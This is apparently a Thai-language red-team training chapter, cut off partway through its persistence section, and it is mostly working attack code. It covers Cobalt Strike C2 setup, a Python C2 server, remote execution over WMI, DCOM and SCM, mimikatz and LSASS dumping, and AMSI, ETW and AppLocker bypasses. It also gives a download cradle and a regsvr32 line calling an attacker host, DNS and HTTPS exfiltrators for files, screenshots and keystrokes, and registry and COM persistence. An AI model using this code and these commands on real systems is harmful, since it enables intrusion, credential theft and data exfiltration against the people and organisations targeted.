# ส่วนที่ 19: Red Team Operations และ Advanced Tradecraft

## ขั้นตอนที่ 181: Red Team Planning และ Rules of Engagement

### การวางแผน Red Team Operation

Red Team Operation ที่ดีต้องมีการวางแผนอย่างละเอียด:

```
Red Team Operation Framework:
┌─────────────────────────────────────────────┐
│ Phase 1: Pre-Engagement                     │
│  - Scope Definition                         │
│  - Rules of Engagement (ROE)                │
│  - Legal Authorization                      │
│  - Communication Plan                       │
│  - Emergency Contacts                       │
├─────────────────────────────────────────────┤
│ Phase 2: Reconnaissance                     │
│  - Passive OSINT                           │
│  - Active Scanning                         │
│  - Target Profiling                        │
├─────────────────────────────────────────────┤
│ Phase 3: Initial Access                     │
│  - Phishing Campaigns                      │
│  - External Attack Surface                 │
│  - Physical Security                       │
├─────────────────────────────────────────────┤
│ Phase 4: Post-Exploitation                  │
│  - Persistence Establishment               │
│  - Lateral Movement                        │
│  - Privilege Escalation                    │
│  - Data Exfiltration                       │
├─────────────────────────────────────────────┤
│ Phase 5: Reporting                          │
│  - Executive Summary                       │
│  - Technical Findings                      │
│  - Risk Assessment                         │
│  - Remediation Recommendations             │
└─────────────────────────────────────────────┘
```

### Rules of Engagement Template

```markdown
# Rules of Engagement Document

## Operation Details
- Operation Name: [CODENAME]
- Client: [Organization Name]
- Start Date: [Date]
- End Date: [Date]
- Red Team Lead: [Name]

## Authorized Targets
### In-Scope Systems
- IP Ranges: 192.168.1.0/24, 10.0.0.0/8
- Domains: *.example.com
- Web Applications: https://app.example.com
- Physical Locations: Building A, Floor 2-5

### Out-of-Scope Systems
- Production Database Servers
- Payment Processing Systems
- Third-party hosted services
- Customer-facing production systems (unless approved)

## Authorized Techniques
- [x] Phishing/Spear Phishing
- [x] Network Scanning
- [x] Web Application Testing
- [x] Physical Social Engineering
- [x] Password Spraying
- [ ] Denial of Service (NOT AUTHORIZED)
- [ ] Destructive Payloads (NOT AUTHORIZED)
- [ ] Data Exfiltration of Real Data (NOT AUTHORIZED)

## Notification Procedures
- If critical system is compromised, notify: [Contact]
- Emergency stop code: [CODEWORD]
- Daily check-in time: 17:00

## Evidence Collection
- Screenshot all critical findings
- Maintain operation log with timestamps
- Do not retain sensitive data after operation
```

### Red Team Infrastructure Planning

```python
#!/usr/bin/env python3
# red_team_infra_planner.py - วางแผน Infrastructure สำหรับ Red Team

import json
from datetime import datetime

class RedTeamInfraPlanner:
    def __init__(self, operation_name):
        self.operation_name = operation_name
        self.infrastructure = {
            'c2_servers': [],
            'redirectors': [],
            'phishing_servers': [],
            'payload_servers': [],
            'exfil_servers': []
        }
    
    def add_c2_server(self, ip, domain, protocol, notes):
        self.infrastructure['c2_servers'].append({
            'ip': ip,
            'domain': domain,
            'protocol': protocol,
            'purpose': 'Command and Control',
            'notes': notes,
            'added': datetime.now().isoformat()
        })
    
    def add_redirector(self, ip, c2_backend, notes):
        self.infrastructure['redirectors'].append({
            'ip': ip,
            'forwards_to': c2_backend,
            'purpose': 'Traffic Redirection / C2 Protection',
            'notes': notes
        })
    
    def generate_infra_diagram(self):
        print(f"\n=== {self.operation_name} Infrastructure ===")
        print("\nAttacker -> Redirector -> C2 Server")
        print("Victim -> Redirector -> C2 Server")
        print("\nC2 Servers:")
        for c2 in self.infrastructure['c2_servers']:
            print(f"  [{c2['domain']}] {c2['ip']} ({c2['protocol']})")
        print("\nRedirectors:")
        for r in self.infrastructure['redirectors']:
            print(f"  [{r['ip']}] -> {r['forwards_to']}")
    
    def export_config(self, filename):
        config = {
            'operation': self.operation_name,
            'generated': datetime.now().isoformat(),
            'infrastructure': self.infrastructure
        }
        with open(filename, 'w') as f:
            json.dump(config, f, indent=2)
        print(f"[+] Config exported to {filename}")

# ตัวอย่างการใช้งาน
planner = RedTeamInfraPlanner("Operation Shadow Fox")

# C2 Servers
planner.add_c2_server(
    ip="1.2.3.4",
    domain="updates.microsoft-cdn.net",
    protocol="HTTPS/443",
    notes="Primary Cobalt Strike C2 - disguised as Microsoft CDN"
)

planner.add_c2_server(
    ip="5.6.7.8", 
    domain="cdn.akamai-cdn.net",
    protocol="DNS",
    notes="Backup DNS C2 for when HTTPS is blocked"
)

# Redirectors
planner.add_redirector(
    ip="9.10.11.12",
    c2_backend="1.2.3.4",
    notes="Apache mod_rewrite redirector - hides real C2 IP"
)

planner.generate_infra_diagram()
planner.export_config("/tmp/infra_config.json")
```

### Apache Redirector Configuration (Malleable C2)

```apache
# /etc/apache2/sites-available/redirector.conf
# Apache mod_rewrite สำหรับ C2 Redirector

<VirtualHost *:443>
    ServerName updates.microsoft-cdn.net
    
    SSLEngine on
    SSLCertificateFile /etc/letsencrypt/live/updates.microsoft-cdn.net/cert.pem
    SSLCertificateKeyFile /etc/letsencrypt/live/updates.microsoft-cdn.net/privkey.pem
    
    RewriteEngine On
    RewriteCond %{HTTP_USER_AGENT} "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" [NC]
    RewriteRule ^/updates/(.*)$ https://REAL_C2_IP/$1 [P,L]
    
    # Redirect everything else to legitimate Microsoft
    RewriteRule ^(.*)$ https://www.microsoft.com/ [R=302,L]
</VirtualHost>
```

---

## ขั้นตอนที่ 182: Cobalt Strike และ C2 Frameworks

### Cobalt Strike Basics

```
Cobalt Strike Architecture:

[Team Server]
    |
    |-- HTTP/HTTPS Listener
    |-- DNS Listener  
    |-- SMB Pipe Listener
    |
[Beacon] (on victim)
    |-- Check-in every X seconds
    |-- Execute commands
    |-- Spawn additional beacons
    |-- Lateral movement
```

### Malleable C2 Profile

```
# amazon.profile - Malleable C2 Profile ที่ simulate Amazon traffic

set sleeptime "60000";    # 60 second check-in
set jitter "20";           # 20% jitter
set maxdns "255";
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";

http-get {
    set uri "/s/ref=nb_sb_noss_1/167-3294888-0262949/field-keywords=books";
    
    client {
        header "Accept" "text/html,application/xhtml+xml,application/xml";
        header "Accept-Language" "en-US,en;q=0.5";
        header "Referer" "http://www.amazon.com/";
        header "Cookie" "skin=noskin;";
        
        metadata {
            base64;
            prepend "session-token=";
            prepend "skin=noskin; csm-hit=s-24KU11BB82RZSYNGMUTA|1419899012996;";
            header "Cookie";
        }
    }
    
    server {
        header "Server" "Server";
        header "x-amz-id-1" "THKUYEZKCKPGY5T42PZT";
        header "x-amz-id-2" "a21yZ2xrNDNtdGRsa212bGV3ND3MTIyMzEzNDM4NTIyMjU0MDI3Njk=";
        header "x-content-type-options" "nosniff";
        
        output {
            print;
        }
    }
}
```

### Beacon Commands

```bash
# คำสั่งพื้นฐานใน Cobalt Strike Beacon

# System Information
beacon> sysinfo
beacon> ps
beacon> getuid
beacon> pwd

# File Operations  
beacon> ls C:\\Users
beacon> download C:\\Users\\victim\\Desktop\\passwords.txt
beacon> upload /local/path/payload.exe C:\\Windows\\Temp\\payload.exe

# Screenshot
beacon> screenshot

# Keylogger
beacon> keylogger
beacon> keystrokes

# Browser pivot
beacon> browserpivot 1234 8080

# Port forwarding
beacon> rportfwd 8080 127.0.0.1 80
beacon> socks 1080

# Token Manipulation
beacon> getprivs
beacon> steal_token 1234
beacon> getsystem
beacon> rev2self

# Lateral Movement
beacon> jump psexec TARGET_IP smb
beacon> jump winrm TARGET_IP winrm
beacon> remote-exec wmi TARGET_IP "cmd /c whoami"

# Kerberos
beacon> kerberos_ticket_use /path/to/ticket.kirbi
beacon> dcsync TARGET_DOMAIN DOMAIN\\Administrator

# OPSEC
beacon> sleep 300 20    # Sleep 5 minutes with 20% jitter
beacon> checkin         # Force immediate check-in
```

### สร้าง Custom C2 ด้วย Python (Sliver-like)

```python
#!/usr/bin/env python3
# simple_c2_server.py - Simple C2 สำหรับการศึกษา

from flask import Flask, request, jsonify
import base64
import uuid
import threading
import queue
from datetime import datetime

app = Flask(__name__)

# เก็บข้อมูล beacons
beacons = {}
task_queues = {}  # queue สำหรับแต่ละ beacon
result_store = {}

class Beacon:
    def __init__(self, beacon_id, hostname, username, ip):
        self.id = beacon_id
        self.hostname = hostname
        self.username = username
        self.ip = ip
        self.os = 'Unknown'
        self.last_seen = datetime.now()
        self.status = 'active'

@app.route('/api/v1/check', methods=['POST'])
def beacon_check_in():
    """Beacon check-in endpoint"""
    data = request.json
    beacon_id = data.get('id')
    
    if beacon_id not in beacons:
        # New beacon
        beacon_id = str(uuid.uuid4())[:8]
        beacons[beacon_id] = Beacon(
            beacon_id=beacon_id,
            hostname=data.get('hostname', 'unknown'),
            username=data.get('username', 'unknown'),
            ip=request.remote_addr
        )
        task_queues[beacon_id] = queue.Queue()
        print(f"[+] New beacon: {beacon_id} from {data.get('hostname')}")
    
    # Update last seen
    beacons[beacon_id].last_seen = datetime.now()
    
    # Check for tasks
    tasks = []
    try:
        while not task_queues[beacon_id].empty():
            tasks.append(task_queues[beacon_id].get_nowait())
    except:
        pass
    
    return jsonify({
        'id': beacon_id,
        'tasks': tasks
    })

@app.route('/api/v1/result', methods=['POST'])
def receive_result():
    """รับผลลัพธ์จาก beacon"""
    data = request.json
    beacon_id = data.get('id')
    task_id = data.get('task_id')
    result = base64.b64decode(data.get('output', '')).decode('utf-8', errors='replace')
    
    if beacon_id not in result_store:
        result_store[beacon_id] = {}
    result_store[beacon_id][task_id] = result
    
    print(f"[*] Result from {beacon_id} (task {task_id}):")
    print(result[:500])
    
    return jsonify({'status': 'received'})

@app.route('/api/v1/task', methods=['POST'])
def add_task():
    """เพิ่ม task ให้ beacon (ใช้จาก operator)"""
    data = request.json
    beacon_id = data.get('beacon_id')
    command = data.get('command')
    
    if beacon_id not in task_queues:
        return jsonify({'error': 'Beacon not found'}), 404
    
    task = {
        'id': str(uuid.uuid4())[:8],
        'command': command,
        'created': datetime.now().isoformat()
    }
    
    task_queues[beacon_id].put(task)
    print(f"[+] Task queued for {beacon_id}: {command}")
    
    return jsonify({'status': 'queued', 'task_id': task['id']})

@app.route('/api/v1/beacons', methods=['GET'])
def list_beacons():
    """แสดง active beacons"""
    result = []
    for bid, b in beacons.items():
        result.append({
            'id': bid,
            'hostname': b.hostname,
            'username': b.username,
            'ip': b.ip,
            'last_seen': b.last_seen.isoformat()
        })
    return jsonify(result)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8443, ssl_context='adhoc', debug=False)
```

---

## ขั้นตอนที่ 183: Lateral Movement Techniques

### Pass-the-Hash

```bash
# Pass-the-Hash ด้วย impacket
python3 psexec.py -hashes :NTLM_HASH Administrator@TARGET_IP
python3 wmiexec.py -hashes :NTLM_HASH Administrator@TARGET_IP
python3 smbexec.py -hashes :NTLM_HASH Administrator@TARGET_IP

# ด้วย CrackMapExec
cme smb TARGET_IP -u Administrator -H NTLM_HASH --exec-method smbexec
cme smb 192.168.1.0/24 -u Administrator -H NTLM_HASH  # Network scan

# ด้วย Evil-WinRM
evil-winrm -i TARGET_IP -u Administrator -H NTLM_HASH
```

### Pass-the-Ticket (Kerberos)

```bash
# Export tickets ด้วย mimikatz
mimikatz # sekurlsa::tickets /export
mimikatz # kerberos::list /export

# Import ticket ใน Linux (impacket)
export KRB5CCNAME=/path/to/ticket.ccache
python3 psexec.py -k -no-pass TARGET_HOST

# Overpass-the-Hash (convert NTLM to Kerberos)
mimikatz # sekurlsa::pth /user:Administrator /domain:DOMAIN /ntlm:HASH /run:cmd.exe
```

### WMI Lateral Movement

```python
#!/usr/bin/env python3
# wmi_lateral_movement.py

from impacket.dcerpc.v5.dcomrt import DCOMConnection
from impacket.dcerpc.v5.dcom import wmi
from impacket.dcerpc.v5.dtypes import NULL

def wmi_exec(target, username, password, domain, command):
    dcom = DCOMConnection(
        target,
        username=username,
        password=password,
        domain=domain,
        oxidResolver=True
    )
    
    iInterface = dcom.CoCreateInstanceEx(
        wmi.CLSID_WbemLevel1Login,
        wmi.IID_IWbemLevel1Login
    )
    
    iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)
    iWbemServices = iWbemLevel1Login.NTLMLogin('//./root/cimv2', NULL, NULL)
    
    iWbemServices.SetProxy(iWbemServices.get_dce_rpc())
    
    win32Process, _ = iWbemServices.GetObject('Win32_Process')
    win32Process.Create(command, 'C:\\', None)
    
    print(f"[+] Command executed on {target}: {command}")
    dcom.disconnect()

# ตัวอย่างการใช้งาน
wmi_exec(
    target='192.168.1.100',
    username='Administrator',
    password='Password123',
    domain='CORP',
    command='cmd /c whoami > C:\\temp\\output.txt'
)
```

### PowerShell Remoting Lateral Movement

```powershell
# PowerShell Remoting
New-PSSession -ComputerName TARGET_HOST -Credential DOMAIN\user
Enter-PSSession -ComputerName TARGET_HOST

# One-liner execution
Invoke-Command -ComputerName TARGET_HOST -ScriptBlock { whoami; hostname }

# With explicit credentials
$cred = Get-Credential
Invoke-Command -ComputerName TARGET_HOST -Credential $cred -ScriptBlock {
    # Commands to run remotely
    Get-Process
    Get-LocalUser
    whoami /priv
}

# Copy and execute file
Copy-Item -Path C:\payload.exe -Destination \\TARGET_HOST\C$\Windows\Temp\payload.exe
Invoke-Command -ComputerName TARGET_HOST -ScriptBlock { 
    Start-Process C:\Windows\Temp\payload.exe 
}
```

### DCOM Lateral Movement

```powershell
# DCOM lateral movement via MMC20.Application
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "TARGET_IP"))
$com.Document.ActiveView.ExecuteShellCommand('cmd.exe', $null, '/c whoami > C:\\output.txt', '7')

# Via ShellWindows
$com = [activator]::CreateInstance([type]::GetTypeFromCLSID('9BA05972-F6A8-11CF-A442-00A0C90A8F39', 'TARGET_IP'))
$item = $com.Item()
$item.Document.Application.ShellExecute('cmd.exe', '/c calc.exe', 'C:\\Windows\\System32', $null, 0)

# Via ShellBrowserWindow  
$com = [activator]::CreateInstance([type]::GetTypeFromCLSID('C08AFD90-F2A1-11D1-8455-00A0C91F3880', 'TARGET_IP'))
$com.Document.Application.ShellExecute('cmd.exe', '/c whoami', 'C:\\Windows\\System32', $null, 0)
```

### SCM Lateral Movement (PsExec-style)

```python
#!/usr/bin/env python3
# scm_exec.py - Service Control Manager execution

from impacket import smbconnection
from impacket.dcerpc.v5 import transport, scmr
import random
import string

def scm_exec(target, username, password, domain, command):
    rpctransport = transport.DCERPCTransportFactory(f'ncacn_np:{target}[\\pipe\\svcctl]')
    rpctransport.set_credentials(username, password, domain)
    
    dce = rpctransport.get_dce_rpc()
    dce.connect()
    dce.bind(scmr.MSRPC_UUID_SCMR)
    
    # Open Service Manager
    scm = scmr.hROpenSCManagerW(dce)
    
    # Create random service name
    svc_name = ''.join(random.choices(string.ascii_lowercase, k=8))
    
    # Create service
    scmr.hRCreateServiceW(
        dce,
        scm['lpScHandle'],
        svc_name,
        svc_name,
        lpBinaryPathName=f'cmd /c {command}',
        dwStartType=scmr.SERVICE_DEMAND_START
    )
    
    # Open service
    svc_handle = scmr.hROpenServiceW(dce, scm['lpScHandle'], svc_name)
    
    # Start service
    try:
        scmr.hRStartServiceW(dce, svc_handle['lpServiceHandle'])
    except:
        pass  # Service may exit immediately
    
    # Delete service
    scmr.hRDeleteService(dce, svc_handle['lpServiceHandle'])
    scmr.hRCloseServiceHandle(dce, svc_handle['lpServiceHandle'])
    scmr.hRCloseServiceHandle(dce, scm['lpScHandle'])
    
    dce.disconnect()
    print(f"[+] Command executed via SCM on {target}")
```

---

## ขั้นตอนที่ 184: Credential Harvesting

### Mimikatz Credential Dumping

```bash
# รัน mimikatz แบบต่างๆ
# Direct execution
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# Dump credentials
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # sekurlsa::logonpasswords full
mimikatz # sekurlsa::wdigest          # Clear-text passwords
mimikatz # sekurlsa::msv              # NTLM hashes
mimikatz # sekurlsa::kerberos         # Kerberos passwords
mimikatz # sekurlsa::tspkg            # TsPkg passwords

# SAM Database
mimikatz # lsadump::sam
mimikatz # lsadump::sam /patch        # Patch first

# LSA Secrets
mimikatz # lsadump::secrets
mimikatz # lsadump::cache             # Cached credentials

# DCSync (requires Domain Admin)
mimikatz # lsadump::dcsync /domain:corp.local /user:Administrator
mimikatz # lsadump::dcsync /domain:corp.local /all /csv
```

### Dump Credentials Without Mimikatz

```python
#!/usr/bin/env python3
# credential_harvester.py - ดึง credentials จากหลายแหล่ง

import os
import subprocess
import re

def harvest_windows_credentials():
    """ดึง credentials จาก Windows"""
    creds = []
    
    # Windows Credential Manager
    try:
        result = subprocess.run(
            ['cmdkey', '/list'],
            capture_output=True, text=True
        )
        creds.append({'source': 'Credential Manager', 'data': result.stdout})
    except:
        pass
    
    # Registry - saved passwords
    reg_paths = [
        'HKCU\\Software\\Microsoft\\Internet Explorer\\IntelliForms\\Storage2',
        'HKCU\\Software\\Google\\Chrome\\Passwords',
        'HKLM\\SYSTEM\\CurrentControlSet\\Services\\SNMP\\Parameters\\ValidCommunities'
    ]
    
    for path in reg_paths:
        try:
            result = subprocess.run(
                ['reg', 'query', path],
                capture_output=True, text=True
            )
            if result.returncode == 0:
                creds.append({'source': f'Registry: {path}', 'data': result.stdout})
        except:
            pass
    
    # Search for config files with passwords
    search_locations = [
        'C:\\Users',
        'C:\\Program Files',
        'C:\\inetpub'
    ]
    
    password_patterns = [
        r'password\s*[=:]\s*(\S+)',
        r'passwd\s*[=:]\s*(\S+)',
        r'pwd\s*[=:]\s*(\S+)'
    ]
    
    return creds

def search_credential_files():
    """ค้นหาไฟล์ที่อาจมี credentials"""
    interesting_files = []
    
    # Common credential file locations
    locations = [
        os.path.expanduser('~/.ssh/'),
        os.path.expanduser('~/.aws/'),
        os.path.expanduser('~/.config/'),
        '/etc/'
    ]
    
    credential_filenames = [
        'id_rsa', 'id_dsa', 'id_ecdsa', 'id_ed25519',
        '.env', 'credentials', 'config',
        'web.config', 'application.properties', 'settings.py'
    ]
    
    for location in locations:
        if os.path.exists(location):
            for root, dirs, files in os.walk(location):
                for filename in files:
                    if filename in credential_filenames or filename.endswith('.conf'):
                        filepath = os.path.join(root, filename)
                        interesting_files.append(filepath)
    
    return interesting_files

# Browser credential extraction
def extract_chrome_passwords():
    """ดึง saved passwords จาก Chrome"""
    import sqlite3
    import json
    
    # Chrome password database location
    chrome_db = os.path.expanduser(
        '~/.config/google-chrome/Default/Login Data'
    )
    
    if not os.path.exists(chrome_db):
        return []
    
    # Copy DB to avoid lock
    import shutil
    temp_db = '/tmp/chrome_login_data'
    shutil.copy(chrome_db, temp_db)
    
    passwords = []
    conn = sqlite3.connect(temp_db)
    cursor = conn.cursor()
    
    cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
    
    for row in cursor.fetchall():
        url, username, encrypted_password = row
        passwords.append({
            'url': url,
            'username': username,
            'password': '(encrypted)'
        })
    
    conn.close()
    os.remove(temp_db)
    return passwords

creds = harvest_windows_credentials()
print(f"[+] Found {len(creds)} credential sources")

files = search_credential_files()
print(f"[+] Found {len(files)} interesting files")
for f in files[:10]:
    print(f"  - {f}")
```

### LSASS Dump Methods

```bash
# Method 1: Task Manager (GUI)
# คลิกขวา lsass.exe -> Create dump file

# Method 2: ProcDump
procdup64.exe -accepteula -ma lsass.exe lsass.dmp

# Method 3: rundll32 comsvcs.dll
tasklist | findstr lsass
rundll32.exe comsvcs.dll MiniDump <PID> C:\\Windows\\Temp\\lsass.dmp full

# Method 4: impacket-secretsdump (remote)
python3 secretsdump.py DOMAIN/Administrator:Password@TARGET_IP

# Analyze dump locally
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

---

## ขั้นตอนที่ 185: Defense Evasion Techniques

### AMSI Bypass

```powershell
# AMSI Bypass Techniques (Educational)

# Method 1: Reflection-based patch
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils') | ForEach-Object {
    $_.GetField('amsiInitFailed', 'NonPublic,Static').SetValue($null, $true)
}

# Method 2: Direct memory patch
$a=[Ref].Assembly.GetTypes();
ForEach($b in $a) {
    if ($b.Name -like "*iUtils") {
        [Runtime.InteropServices.Marshal]::WriteInt32($b.GetField('amsiSession','NonPublic,Static').GetValue($null), -2)
    }
}

# Method 3: Context overwrite
$v=[Runtime.InteropServices.Marshal]::AllocHGlobal(9076)
[IntPtr]$p = [Runtime.InteropServices.Marshal]::ReadIntPtr($v)
```

### ETW (Event Tracing for Windows) Bypass

```csharp
// ETW patch in C#
using System;
using System.Runtime.InteropServices;

public class ETWPatch {
    [DllImport("kernel32")]
    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    
    [DllImport("kernel32")]
    static extern IntPtr LoadLibrary(string name);
    
    [DllImport("kernel32")]
    static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    
    public static void PatchETW() {
        IntPtr ntdll = LoadLibrary("ntdll.dll");
        IntPtr etwAddr = GetProcAddress(ntdll, "EtwEventWrite");
        
        uint oldProtect;
        VirtualProtect(etwAddr, (UIntPtr)4, 0x40, out oldProtect);
        
        // Patch with ret instruction
        Marshal.WriteByte(etwAddr, 0xC3);
        
        VirtualProtect(etwAddr, (UIntPtr)4, oldProtect, out oldProtect);
    }
}
```

### AppLocker Bypass

```powershell
# AppLocker bypass techniques

# Via InstallUtil (whitelisted)
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U payload.exe

# Via regsvr32
regsvr32 /s /n /u /i:http://ATTACKER_IP/payload.sct scrobj.dll

# Via msbuild
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe payload.csproj

# Via rundll32
rundll32.exe javascript:"..\\mshtml,RunHTMLApplication";document.write();new%20ActiveXObject("WScript.Shell").Run("cmd /c whoami")

# Via wscript/cscript
wscript.exe //e:jscript payload.js
cscript.exe //e:vbscript payload.vbs

# AppLocker bypass via DLL
regsvcs.exe payload.dll
regasm.exe /u payload.dll
```

### Obfuscation Techniques

```python
#!/usr/bin/env python3
# payload_obfuscator.py - Obfuscate payloads

import base64
import random
import string

def obfuscate_powershell(ps_command):
    """Obfuscate PowerShell command"""
    # Encode as Base64
    encoded = base64.b64encode(ps_command.encode('utf-16le')).decode()
    
    # Build obfuscated launcher
    # Split encoded string
    parts = [encoded[i:i+20] for i in range(0, len(encoded), 20)]
    
    ps_script = f"""
$a = @({', '.join([f'\'{p}\'' for p in parts])})
$b = [System.Convert]::FromBase64String(($a -join ''))
$c = [System.Text.Encoding]::Unicode.GetString($b)
IEX $c
"""
    return ps_script

def caesar_cipher_payload(payload, shift=13):
    """Simple Caesar cipher obfuscation"""
    result = []
    for char in payload:
        if char.isalpha():
            shifted = ord(char) + shift
            if char.isupper():
                if shifted > ord('Z'):
                    shifted -= 26
            else:
                if shifted > ord('z'):
                    shifted -= 26
            result.append(chr(shifted))
        else:
            result.append(char)
    return ''.join(result)

def xor_obfuscate(payload_bytes, key):
    """XOR obfuscation"""
    return bytes([b ^ key for b in payload_bytes])

def generate_random_varname():
    """สร้างชื่อตัวแปรแบบ random"""
    return ''.join(random.choices(string.ascii_letters, k=random.randint(5, 15)))

def obfuscate_vba_macro(macro_code):
    """Obfuscate VBA macro"""
    # Replace common strings
    obfuscated = macro_code
    
    # Add random comments
    lines = obfuscated.split('\n')
    result_lines = []
    for line in lines:
        result_lines.append(line)
        if random.random() < 0.3:
            result_lines.append(f"' {generate_random_varname()}")
    
    return '\n'.join(result_lines)

# Example usage
ps_cmd = 'IEX (New-Object Net.WebClient).DownloadString("http://ATTACKER/payload.ps1")'
obfuscated = obfuscate_powershell(ps_cmd)
print("Obfuscated PS:")
print(obfuscated[:200])
```

---

## ขั้นตอนที่ 186: Data Exfiltration Techniques

### DNS Exfiltration

```python
#!/usr/bin/env python3
# dns_exfil.py - Data Exfiltration ผ่าน DNS

import socket
import base64
import hashlib
import time

class DNSExfiltrator:
    def __init__(self, attacker_domain, chunk_size=30):
        self.attacker_domain = attacker_domain
        self.chunk_size = chunk_size
    
    def exfil_data(self, data, label='exfil'):
        """ส่งข้อมูลผ่าน DNS queries"""
        # Encode data
        encoded = base64.b32encode(data.encode()).decode().rstrip('=')
        
        # Split into chunks
        chunks = [encoded[i:i+self.chunk_size] 
                  for i in range(0, len(encoded), self.chunk_size)]
        
        total = len(chunks)
        print(f"[*] Exfiltrating {len(data)} bytes in {total} DNS queries")
        
        for i, chunk in enumerate(chunks):
            # Format: chunk_index.total.label.chunk_data.attacker_domain
            fqdn = f"{i}.{total}.{label}.{chunk}.{self.attacker_domain}"
            
            try:
                socket.gethostbyname(fqdn)
            except:
                pass  # DNS query sent regardless of response
            
            time.sleep(0.1)  # Rate limiting
            
            if i % 10 == 0:
                print(f"  Progress: {i}/{total}")
        
        print(f"[+] Exfiltration complete")

# Server side (on attacker)
class DNSExfilServer:
    def __init__(self):
        self.received_chunks = {}
    
    def process_query(self, domain):
        """Process incoming DNS query"""
        parts = domain.split('.')
        if len(parts) >= 4:
            chunk_idx = int(parts[0])
            total = int(parts[1])
            label = parts[2]
            data = parts[3]
            
            if label not in self.received_chunks:
                self.received_chunks[label] = {}
            
            self.received_chunks[label][chunk_idx] = data
            
            # Check if all chunks received
            if len(self.received_chunks[label]) == total:
                self.reconstruct(label, total)
    
    def reconstruct(self, label, total):
        """Reconstruct exfiltrated data"""
        chunks = self.received_chunks[label]
        full_b32 = ''.join([chunks[i] for i in sorted(chunks.keys())])
        
        # Add padding
        padding = 8 - (len(full_b32) % 8)
        if padding != 8:
            full_b32 += '=' * padding
        
        data = base64.b32decode(full_b32).decode()
        print(f"\n[+] Received data ({label}):")
        print(data)
        print()

exfil = DNSExfiltrator('attacker-domain.com')
exfil.exfil_data('Secret company data: passwords, documents...', 'corp-data')
```

### HTTPS Exfiltration

```python
#!/usr/bin/env python3
# https_exfil.py - Exfiltration ผ่าน HTTPS

import requests
import base64
import json
import gzip
import ssl

class HTTPSExfiltrator:
    def __init__(self, c2_url, auth_token):
        self.c2_url = c2_url
        self.auth_token = auth_token
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Authorization': f'Bearer {auth_token}'
        })
    
    def exfil_file(self, filepath, chunk_size=1024*64):
        """ส่งไฟล์ผ่าน HTTPS"""
        with open(filepath, 'rb') as f:
            data = f.read()
        
        # Compress
        compressed = gzip.compress(data)
        
        # Encode
        encoded = base64.b64encode(compressed).decode()
        
        # Send
        response = self.session.post(
            f'{self.c2_url}/api/upload',
            json={
                'filename': filepath.split('/')[-1],
                'data': encoded,
                'size': len(data)
            }
        )
        
        return response.status_code == 200
    
    def exfil_screenshot(self):
        """ส่ง screenshot"""
        try:
            import pyautogui
            import io
            
            screenshot = pyautogui.screenshot()
            buf = io.BytesIO()
            screenshot.save(buf, format='PNG')
            image_data = base64.b64encode(buf.getvalue()).decode()
            
            response = self.session.post(
                f'{self.c2_url}/api/screenshot',
                json={'image': image_data}
            )
            return response.status_code == 200
        except ImportError:
            print("[-] pyautogui not available")
            return False
    
    def exfil_keystrokes(self, keystrokes):
        """ส่ง keystrokes"""
        encoded = base64.b64encode(keystrokes.encode()).decode()
        response = self.session.post(
            f'{self.c2_url}/api/keys',
            json={
                'data': encoded,
                'timestamp': __import__('time').time()
            }
        )
        return response.status_code == 200

# Steganography-based exfil
def steganography_exfil(image_path, secret_data, output_path):
    """ซ่อนข้อมูลใน image (LSB steganography)"""
    from PIL import Image
    import struct
    
    img = Image.open(image_path)
    pixels = list(img.getdata())
    
    # Prepare data
    data = secret_data.encode() + b'\x00\x00\x00'  # Null terminator
    binary_data = ''.join(format(byte, '08b') for byte in data)
    
    # Embed in LSB of pixels
    new_pixels = []
    data_idx = 0
    
    for pixel in pixels:
        if data_idx < len(binary_data):
            r, g, b = pixel[:3]
            r = (r & 0xFE) | int(binary_data[data_idx])
            data_idx += 1
            if data_idx < len(binary_data):
                g = (g & 0xFE) | int(binary_data[data_idx])
                data_idx += 1
            if data_idx < len(binary_data):
                b = (b & 0xFE) | int(binary_data[data_idx])
                data_idx += 1
            new_pixels.append((r, g, b))
        else:
            new_pixels.append(pixel[:3])
    
    img.putdata(new_pixels)
    img.save(output_path)
    print(f"[+] Data hidden in {output_path}")
```

---

## ขั้นตอนที่ 187: Persistence Mechanisms Advanced

### COM Hijacking

```powershell
# COM Object Hijacking
# ค้นหา COM objects ที่ hijackable

# ค้นหา CLSID ที่ HKCU ไม่มี แต่ HKLM มี
$clsids = Get-ItemProperty 'HKLM:\Software\Classes\CLSID\*\InprocServer32' | 
    Where-Object {$_.PSChildName -eq 'InprocServer32'} |
    Select-Object -ExpandProperty PSParentPath

foreach ($clsid in $clsids) {
    $id = $clsid.Split('\')[-2]
    $hkcu_path = "HKCU:\Software\Classes\CLSID\$id"
    if (-not (Test-Path $hkcu_path)) {
        Write-Host "Hijackable CLSID: $id"
    }
}

# Create hijacked COM object
$CLSID = '{your-target-clsid}'
$path = "HKCU:\Software\Classes\CLSID\$CLSID\InprocServer32"
New-Item -Path $path -Force
Set-ItemProperty -Path $path -Name '(Default)' -Value 'C:\path\to\payload.dll'
Set-ItemProperty -Path $path -Name 'ThreadingModel' -Value 'Both'
```

### Registry Run Keys Persistence

```python
#!/usr/bin/env python3
# persistence_manager.py - จัดการ Persistence mechanisms

import winreg
import os
import shutil

class PersistenceManager:
    def __init__(self):
        self.methods = []
    
    def run_key_persistence(self, name, payload_path):
        """เพิ่ม Run key persistence"""
        keys = [
            (winreg.HKEY_CURRENT_USER, 
             'Software\\Microsoft\\Windows\\CurrentVersion\\Run'),
            (winreg.HKEY_LOCAL_MACHINE, 
             'Software\\Microsoft\\Windows\\CurrentVersion\\Run'),
            (winreg.HKEY_CURRENT_USER, 
